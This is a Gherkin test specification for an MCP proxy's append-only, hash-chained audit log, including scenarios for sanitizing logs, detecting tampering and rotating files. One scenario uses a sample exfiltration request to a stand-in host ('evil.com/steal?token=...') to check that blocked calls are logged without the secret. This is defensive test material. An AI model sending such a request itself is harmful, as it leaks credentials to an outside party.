# Intent: idd/modules/mcp-proxy/INTENT.md
# Constraints covered: C35 (all methods logged), C36 (hash chaining over canonicalized JSON),
#                     C37 (no sensitive data), C38 (rotation)
# Phase split: @phase-1 = basic pass-through logging (no chaining yet, minimal fields)
#              @phase-4 = hash chaining, canonicalization, tamper detection, rotation

@mcp-proxy
@audit
Feature: Audit trail — append-only tamper-evident logging
  As a security-conscious organization
  I need every MCP tool call logged with tamper-evident hash chaining
  So that I can audit what tools were called, what was blocked, and detect log tampering

  Background:
    Given the proxy is running with a child MCP server
    And the audit log at "~/.tank/proxy/audit.jsonl" is empty

  # ══════════════════════════════════════════════════════════════════════════
  # Phase 1: Minimal pass-through logging (no chaining yet)
  # ══════════════════════════════════════════════════════════════════════════
  @high
  @happy-flow
  @phase-1
  @C35
  Scenario: Phase 1 — Tool call produces a minimal audit log entry
    When the agent calls tool "read_file" with arguments {"path": "./README.md"}
    And the call passes all security checks
    Then the audit log contains exactly 1 entry
    And the entry has fields: timestamp, method, tool_name, verdict
    And verdict is "pass"
    And tool_name is "read_file"
    And method is "tools/call"
    And timestamp is within 1 second of now

  @high
  @phase-1
  @C35
  Scenario: Phase 1 — tools/list is logged
    When the agent sends a "tools/list" request
    Then the audit log contains an entry with method "tools/list"

  @high
  @phase-1
  @C35
  Scenario: Phase 1 — resources/read is logged
    When the agent sends a "resources/read" request
    Then the audit log contains an entry with method "resources/read"

  @high
  @phase-1
  @C35
  Scenario: Phase 1 — prompts/get is logged
    When the agent sends a "prompts/get" request
    Then the audit log contains an entry with method "prompts/get"

  @high
  @phase-1
  @C37
  Scenario: Phase 1 — Audit log does not contain tool arguments
    When the agent calls tool "read_file" with arguments {"path": "./secrets.env"}
    Then the audit log entry does NOT contain "./secrets.env"
    And the entry does NOT contain any tool arguments
    And the entry contains only non-sensitive fields from the canonical minimal set (timestamp, method, tool_name, verdict, optional reason)

  # ══════════════════════════════════════════════════════════════════════════
  # Phase 4: Hash chaining, canonicalization, tamper detection, rotation
  # ══════════════════════════════════════════════════════════════════════════
  @high
  @phase-4
  @C36
  @hash-chain
  Scenario: Phase 4 — Consecutive log entries are hash-chained
    When the agent calls tool "read_file" and the call passes
    And the agent calls tool "write_file" and the call passes
    Then the audit log contains 2 entries
    And entry 2's prev_hash equals SHA-256 of canonicalized JSON of entry 1 (sorted keys, no whitespace, UTF-8)

  @high
  @phase-4
  @C36
  @hash-chain
  Scenario: Phase 4 — First entry has null prev_hash
    When the agent calls tool "read_file" and the call passes
    Then entry 1's prev_hash is null
    And entry 1 is the genesis of the hash chain

  @high
  @phase-4
  @C36
  @canonicalization
  Scenario: Phase 4 — Hash input is canonicalized JSON (key-order independent)
    Given entry 1 serializes with keys {timestamp, tool_name, verdict}
    And the same logical entry serialized with keys {verdict, tool_name, timestamp}
    When the proxy computes the hash for both orderings
    Then both hashes are identical
    And the chain is stable regardless of key emission order

  @high
  @phase-4
  @C36
  @tamper-evident
  Scenario: Phase 4 — Tampering with an entry breaks the chain
    Given the audit log contains 5 hash-chained entries
    When an attacker edits entry 3's verdict from "block" to "pass"
    And `tank proxy --verify-audit` is run
    Then verification fails at entry 4 because entry 4's prev_hash no longer matches SHA-256 of canonicalized entry 3
    And the CLI exits with non-zero code
    And stderr contains "audit chain broken at entry 4"

  @high
  @phase-4
  @C35
  Scenario: Phase 4 — Blocked call produces audit entry with reason
    When the agent calls tool "fetch_api" with a URL to an undeclared domain
    And the call is blocked
    Then the audit log contains an entry with verdict "block"
    And the entry includes reason "domain_not_allowed"
    And the entry is hash-chained to its predecessor

  @high
  @phase-4
  @C37
  Scenario: Phase 4 — Audit log for blocked call does not contain blocked argument value
    When the agent calls tool "fetch_api" with arguments {"url": "https://evil.com/steal?token=secret123"}
    And the call is blocked
    Then the audit log entry contains reason "domain_not_allowed"
    And the entry contains sanitized metadata (e.g. domain "evil.com") only
    But does NOT contain "secret123" or the full URL

  # ── Rotation (C38) — Phase 4 ───────────────────────────────────────────
  @medium
  @phase-4
  @C38
  @rotation
  Scenario: Phase 4 — Audit log rotates at 10MB
    Given the audit log file is 9.9MB
    When 100 more tool calls produce log entries pushing the file over 10MB
    Then the old log is rotated to "audit.jsonl.1"
    And a new "audit.jsonl" is created for subsequent entries
    And the hash chain continues across rotation (first entry of new file pins prev_hash = last entry of rotated file)

  @medium
  @phase-4
  @C38
  @rotation
  Scenario: Phase 4 — Only 5 rotated files are kept
    Given 6 rotated audit log files exist (audit.jsonl.1 through audit.jsonl.6)
    When the current log rotates
    Then "audit.jsonl.6" is deleted
    And "audit.jsonl.5" through "audit.jsonl.1" are renamed up by 1

  # ── Edge cases ─────────────────────────────────────────────────────────
  @medium
  @phase-1
  @edge-case
  @C35
  Scenario: Audit log directory does not exist — proxy creates it
    Given "~/.tank/proxy/" directory does not exist
    When the proxy starts and a tool call occurs
    Then the directory is created
    And the audit log entry is written successfully

  @medium
  @phase-1
  @edge-case
  @C35
  Scenario: Audit log file is not writable — proxy logs warning but continues
    Given the audit log file has read-only permissions
    When the agent calls a tool
    Then the proxy logs a stderr warning about audit log write failure
    And the tool call still proceeds (audit is non-blocking)

  @low
  @phase-4
  @edge-case
  @C35
  Scenario: Phase 4 — tools/list response also produces audit entries
    When the agent sends a "tools/list" request
    And the response contains 3 tools, 1 blocked for poisoning
    Then the audit log contains entries for the tools/list event
    And includes which tools passed and which were blocked
    And each entry is hash-chained
